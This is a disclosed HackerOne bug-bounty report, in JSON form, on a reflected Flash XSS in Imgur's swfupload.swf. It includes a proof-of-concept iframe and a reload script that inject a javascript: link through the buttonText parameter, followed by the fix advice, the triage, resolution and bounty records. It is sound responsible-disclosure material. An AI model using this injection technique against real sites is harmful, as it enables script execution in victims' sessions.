{"id":91421,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTQyMQ==","url":"https://hackerone.com/reports/91421","title":"Reflected Flash XSS using swfupload.swf with an epileptic reloading to bypass the button-event","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-10-01T02:12:35.523Z","submitted_at":"2015-10-01T02:12:35.523Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"fransrosen","url":"/fransrosen","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-07-28T10:38:10.790Z","bug_reporter_agreed_on_going_public_at":"2016-06-28T10:37:55.990Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\nThis was a fun one.\n\nSo I noticed you're using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.\n\nHowever, if you're really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:\n```\n\u003ciframe src=\"about:blank\" id=\"x\"\u003e\u003c/iframe\u003e\n\n\u003cscript\u003eu='https://imgur.com/include/flash/swfupload.swf?buttonDisabled=\u0026buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME\u003cbr /\u003eCLICKME%3C/a%3E\u0026buttonImageURL=/\u0026buttonTextStyle=a{color:%23ff00ff}\u0026buttonAction=-120\u0026buttonCursor=-2';\nsetInterval(function(){document.getElementById('x').contentWindow.location=u},300)\u003c/script\u003e\n```\n\nThat will reload the content over and over, and if you click the text in the right time, the XSS will trigger.\n\nI think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.\n\nPoC-image attached.\n\nCheers,\nFrans","vulnerability_information_html":"\u003cp\u003eHi,\u003cbr\u003e\nThis was a fun one.\u003c/p\u003e\n\n\u003cp\u003eSo I noticed you\u0026#39;re using swfupload.swf which is hosted on the main domain, imgur.com. This swfupload.swf as some settings you can use to modify the button on the upload. You can actually insert HTML into the Flash, but the button event (that you select yourself using another parameter) is taking over the MouseClick-event from the HTML-content you provide.\u003c/p\u003e\n\n\u003cp\u003eHowever, if you\u0026#39;re really quick, you can actually catch the even in the HTML anyway. So by making a page that would reload the SWF constantly (from cache that is) you can make a page that looks like this:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;iframe src=\u0026quot;about:blank\u0026quot; id=\u0026quot;x\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\n\n\u0026lt;script\u0026gt;u=\u0026#39;https://imgur.com/include/flash/swfupload.swf?buttonDisabled=\u0026amp;buttonText=%3Ca%20%20href=%22javascript:alert(document.domain)%22%3ECLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME\u0026lt;br /\u0026gt;CLICKME%3C/a%3E\u0026amp;buttonImageURL=/\u0026amp;buttonTextStyle=a{color:%23ff00ff}\u0026amp;buttonAction=-120\u0026amp;buttonCursor=-2\u0026#39;;\nsetInterval(function(){document.getElementById(\u0026#39;x\u0026#39;).contentWindow.location=u},300)\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThat will reload the content over and over, and if you click the text in the right time, the XSS will trigger.\u003c/p\u003e\n\n\u003cp\u003eI think I got an epileptic reaction out of testing this, but it was fun anyway, haha. You should probably move the swfupload.swf to another domain, and just embed it on imgur.com since that will give you the same options as today, but without the possibility to access the SWF directly and inject the parameters on your domain.\u003c/p\u003e\n\n\u003cp\u003ePoC-image attached.\u003c/p\u003e\n\n\u003cp\u003eCheers,\u003cbr\u003e\nFrans\u003c/p\u003e\n","bounty_amount":"50.0","formatted_bounty":"$50","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":55539,"file_name":"Screen_Shot_2015-10-01_at_04.06.05.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/055/539/415eefb0701d1bbf62e90d41ac7a275931a92120/Screen_Shot_2015-10-01_at_04.06.05.png?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2015-10-01_at_04.06.05.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2015-10-01_at_04.06.05.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQUV6IDV73%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T071017Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCXBpBw2P6c96TpPhGunUVoS2EZwPAR0UjOwaNFkDRyUAIgB9DvSM0bpmOT%2FEVdBvHK8iyZgC%2B6mu%2Fxidk8HIEIj0EqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDAuF942NBlJsMTeygiqRA4ABbIq210R5PDf5cm0Q7y%2FFgDztDLV5UzEfzjqpxU8DNXJbPCNopAJeZ8MtHWN%2FZo1lZMnbwlNUl5H9FWLwQd%2FBJ5KiwJOgUMYu7Kk6mWXvV0E5Eqe4R%2FUkAs4WbvrfZM4fq%2FcVTRJgvsOGs5QT8F2N0Sw4MGFbIqFzdInIrucBIcAjjocbp7%2FmMQkl1rCQU8VRqwty309v%2BvQyCXntaBXMnP3h8b2rdGxftWBBOxLTF4NLs%2BOrx3PvIMSR7zpn1PtxcWnCd78ZLY7CS8sz0uMfVuQq%2B%2BWsAHGRRf9GbNJ6aUIsqUWp8p16B%2BJtBD%2FcA25X1IV0Ox5GkYGqecyHk7tIQ7WnJGRCXnsxZcBMwcK7y3HHAFw2T6Iop%2F%2F0kasTRDxEimFiICdzwa8NhkMwoFoFFnYHjYJ%2F4suk27ebqgsVJeq0323Tk4zZVpuGZ7GICfOBss5lvu52vjAcWtCgXl5UkIZtbiqJ5ccBOKz4HA5w%2BvEnEqIydUUpt5IZU4ipKrlfIUy2EBqhtMThWfq%2B%2BBhHMOibq%2F8FOusB64nWJNDDVtspdftl7aqpY%2B8gpHN9Q9dqgpHIwoa0X7rVDmVAWWvT3PE%2FnLv3hgCU1xHdjm9DWxGwfhS1Y5ZTjPHcUKBDh1%2B%2FZW4equEm0wwoan0z7Ppf3nLHlf4YKx2uQzLfQPavZIsawk4YBJxt53W09F4X%2Fi36%2FtexyB8CbbPMFHRrT1iHVdL%2F1Zod%2FAGQIumXSCau15L%2FujfNpINtSSB5Y%2B4JZOEIxuDKJXEYttpTn1nadZrYBadyOkI%2BZOkvY4BLYv1udAwzqOydnc0XaBLIadIaXjPgOKzmslBJY2jJAVGtldIkOds%2FDA%3D%3D\u0026X-Amz-Signature=b6ef78c179401e5ae4d90d95d8aceecaf9d58f631983bb36289a990db111ac26","file_size":148625,"type":"image/png"}],"allow_singular_disclosure_at":"2016-07-28T10:37:56.173Z","allow_singular_disclosure_after":-139523541.5825919,"singular_disclosure_allowed":true,"vote_count":14,"voters":["fransrosen","d1m0ck","xpathmaster","s_p_q_r","zombiehelp54","skansing","r3y","kiraak-boy","adrianbelen","fantam1","and 4 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":612185,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!","markdown_message":"\u003cp\u003eWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-10-07T00:47:17.434Z","updated_at":"2015-10-07T00:47:17.434Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":654438,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! ","markdown_message":"\u003cp\u003eWe have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! \u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-11T19:42:26.811Z","updated_at":"2015-11-11T19:42:26.811Z","actor":{"username":"kcramer","cleared":false,"url":"/kcramer","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"fransrosen","url":"/fransrosen"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":657152,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, great job!","markdown_message":"\u003cp\u003eAwesome, great job!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-13T20:18:20.698Z","updated_at":"2015-11-13T20:18:20.698Z","actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":660324,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"The Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!","markdown_message":"\u003cp\u003eThe Imgur team really appreciates your report and would like to give you a monetary bounty. Thanks for taking the time to report this issue and please let us know if you come upon more issues!\u003c/p\u003e\n","automated_response":false,"created_at":"2015-11-16T23:30:49.651Z","updated_at":"2015-11-16T23:30:49.651Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"bounty_amount":"50.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"fransrosen","url":"/fransrosen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1042609,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Too fun not to publish. :)","markdown_message":"\u003cp\u003eToo fun not to publish. :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-28T10:37:56.032Z","updated_at":"2016-06-28T10:37:56.032Z","first_to_agree":true,"actor":{"username":"fransrosen","cleared":true,"url":"/fransrosen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1092602,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-28T10:39:01.225Z","updated_at":"2016-07-28T10:39:01.225Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}